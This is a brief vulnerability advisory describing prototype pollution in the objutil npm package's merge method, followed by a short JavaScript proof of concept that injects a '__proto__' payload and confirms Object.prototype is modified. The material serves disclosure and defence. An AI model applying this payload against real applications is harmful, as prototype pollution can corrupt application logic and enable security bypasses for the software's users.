# Overview
[objutil](https://www.npmjs.com/package/objutil) is a Javascript Object util methods with deep traverse, with ES6 tree shaking methods.

Affected versions of this package are vulnerable to Prototype Pollution. The merge method could be tricked into adding or modifying properties of Object.prototype.

# Proof of Concept
```js
var a = { x:1,y:{ w:1, z:2 }}
var malicious_payload = '{"__proto__":{"vulnerable":"Polluted"}}';
var {merge, remove} = require('objutil')
result = merge(a,JSON.parse(malicious_payload));
console.log({}.vulnerable);
```
